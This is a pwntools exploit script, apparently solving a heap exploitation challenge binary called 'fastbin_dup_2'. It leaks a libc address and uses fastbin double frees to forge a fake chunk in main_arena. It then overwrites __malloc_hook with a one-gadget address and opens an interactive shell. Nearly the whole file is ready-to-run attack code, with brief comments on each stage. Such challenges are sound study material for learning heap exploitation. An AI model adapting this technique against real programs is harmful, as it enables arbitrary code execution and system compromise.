#This binary challenge doesn't allow request 0x68 size
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./fastbin_dup_2',checksec=False)

libc = elf.libc

gs = """
b *main
b *main+235
b *main+401
b *main+503
"""
#b *main+298 b *main+473

index = 0

def info(mes):
    return log.info(mes)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def malloc(size, data):
    global index
    io.send(b'1')
    io.sendafter(b'size: ', f'{size}'.encode())
    io.sendafter(b'data: ', data)
    io.recvuntil(b'> ')
    index += 1
    return index -1

def free(id):
    io.send(b'2')
    io.sendafter(b'index: ', f'{id}'.encode())
    io.recvuntil(b'> ')

io = start()
#io.timeout = 0.1
io.recvuntil(b'puts() @ ')


puts_leak = int(io.recvline(), 16)
libc.address = puts_leak - libc.sym['puts']
info("puts: " + hex(puts_leak))
info("libc: " + hex(libc.address))

#===========================================================================================
"""" 
Fake chunk in main arena to generate valide chunk size field
"""

chunk_A = malloc(0x48, b'a'*0x48)
chunk_B = malloc(0x48, b'b'*0x48)

free(chunk_A)
free(chunk_B)
free(chunk_A)

malloc(0x48, p64(0x61))

#request to 0x61 move to the head of fastbins(also it is in arena)
malloc(0x48, b'c'*0x48)
malloc(0x48, b'd'*0x48)

"""
Link to main_arena to create fake chunk
"""

dup_A = malloc(0x58, b'd'*0x48)
dup_B = malloc(0x58, b'e'*0x48)

free(dup_A)
free(dup_B)
free(dup_A)

#Link to main_arena

malloc(0x58, p64(libc.sym['main_arena'] + 0x20))

malloc(0x58, b'-p\x00')
#malloc(0x58, b'f'*0x58)
#malloc(0x58, b'g'*0x58)
malloc(0x58, b'-s\x00')
""" 
write to main_arena
"""
# byte \x00 ensure not ovewrite to other fastbins
malloc(0x58, b'\x00'*48 + p64(libc.sym['__malloc_hook'] - 35))

malloc(0x28, p8(0)*19 + p64(libc.address + 0xe1fa1))

malloc(0x18, b'')

io.interactive()
